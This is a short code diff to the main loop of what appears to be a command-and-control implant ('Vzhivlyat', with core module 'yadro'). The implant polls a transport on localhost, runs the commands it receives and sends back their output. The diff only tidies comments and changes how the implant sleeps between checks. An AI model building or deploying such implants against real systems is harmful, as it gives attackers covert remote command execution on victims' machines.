@@ -67,13 +67,11 @@ class Vzhivlyat(object):
 
 vzhivlyat = Vzhivlyat()
 transport_config = {"transport_id": vzhivlyat.component_id, "connect_addr": "127.0.0.1", "connect_port": 8084}
-# transport_config = {"transport_id": vzhivlyat.component_id, "transport_dir": "/Users/jechavarria/work/debug_dir/"}
 vzhivlyat.transport = yadro.import_transport_for_implant(vzhivlyat, transport_config)
 vzhivlyat.prepare_manifest()
 
 while True:
     if len(vzhivlyat.cmd_processing_queue) > 0:
-        # TODO: Execute the commands, move them into cmd_done_queue
         yadro.run_instructions(vzhivlyat)
     if len(vzhivlyat.cmd_done_queue) > 0:
         transport_frame = yadro.send_cmd_output(vzhivlyat)
@@ -90,4 +88,8 @@ while True:
     if len(vzhivlyat.cmd_queue) > 0:
         yadro.process_commands(vzhivlyat)
     vzhivlyat.logging.log(f"Waiting for {vzhivlyat.check_time}", level="debug")
-    sleep(int(vzhivlyat.check_time))
+    for i in range(int(vzhivlyat.check_time)):
+        try:
+            sleep(1)
+        except KeyboardInterrupt:
+            break
